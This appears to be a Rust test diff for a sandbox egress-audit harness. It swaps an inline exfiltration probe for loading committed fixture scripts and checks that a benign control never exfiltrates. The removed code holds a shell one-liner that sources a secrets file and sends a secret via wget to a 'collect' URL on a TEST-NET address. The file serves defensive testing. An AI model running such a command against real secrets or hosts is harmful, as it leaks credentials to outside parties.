@@ -140,16 +140,16 @@ fn read_witness(out_dir: &Path) -> Witness {
     serde_json::from_str(&raw).expect("witness.json deserializes into a Witness")
 }
 
-/// The deterministic exfil-probe for an IP endpoint: read the injected sentinel
-/// (staged by `--secret <NAME>` at `/run/rooms/secrets.env`) and attempt to send
-/// it to the marked endpoint. Scored on the destination; the endpoint is
+/// Load a fixture's actual probe script text (e.g. `probe.sh` or
+/// `control/probe.sh`) to run verbatim as the guest command — so the committed
+/// scripts are exercised, not a reconstruction that could silently drift from
+/// them. The deterministic `exfil-probe` reads the injected sentinel (staged by
+/// `--secret <NAME>` at `/run/rooms/secrets.env`) and attempts to send it to the
+/// marked endpoint; scoring is on the destination, and the endpoint is
 /// unroutable TEST-NET, so nothing reaches a real host.
-fn ip_probe(ip: std::net::Ipv4Addr, secret_name: &str) -> String {
-    format!(
-        "[ -f /run/rooms/secrets.env ] && . /run/rooms/secrets.env; \
-         timeout 8 sh -c 'nc -z -w4 {ip} 80 || \
-         wget -q -T4 -O- \"http://{ip}/collect?k=${{{secret_name}:-unset}}\"' || true"
-    )
+fn load_script(fixture_rel: &str, script_rel: &str) -> String {
+    let path = fixture_dir(fixture_rel).join(script_rel);
+    std::fs::read_to_string(&path).unwrap_or_else(|e| panic!("read {}: {e}", path.display()))
 }
 
 /// Run one trial: inject `secret_name=secret_value` via `--secret`, apply the
@@ -203,7 +203,8 @@ fn two_condition_gate_holds_for_one_fixture() {
         Injection::Env { name } => name.clone(),
         Injection::File { .. } => panic!("demonstrator uses env injection"),
     };
-    let probe = ip_probe(ip, &secret_name);
+    // Run the fixture's committed probe.sh verbatim (not a reconstruction).
+    let probe = load_script(DEMONSTRATOR, &manifest.probe);
 
     let tmp = tempfile::tempdir().expect("tempdir");
 
@@ -256,9 +257,13 @@ fn benign_control_never_exfils() {
         Injection::Env { name } => name.clone(),
         Injection::File { .. } => panic!("demonstrator uses env injection"),
     };
-    // The control is the same shape with NO injection and NO exfil — a benign
-    // build step that never contacts the sentinel endpoint.
-    let control_cmd = "echo build ok";
+    // The control is the same shape with NO injection and NO exfil — run its
+    // committed control/probe.sh verbatim so the benign script is exercised, not
+    // a hardcoded stand-in that could drift from it.
+    let control_cmd = load_script(
+        DEMONSTRATOR,
+        &format!("{}{}", manifest.control, manifest.probe),
+    );
 
     let tmp = tempfile::tempdir().expect("tempdir");
     for policy in [None, Some("none")] {
@@ -270,7 +275,7 @@ fn benign_control_never_exfils() {
             &secret_name,
             sentinel.value,
             policy,
-            control_cmd,
+            &control_cmd,
         );
         assert_eq!(
             egress_audit::classify(&target, &witness),
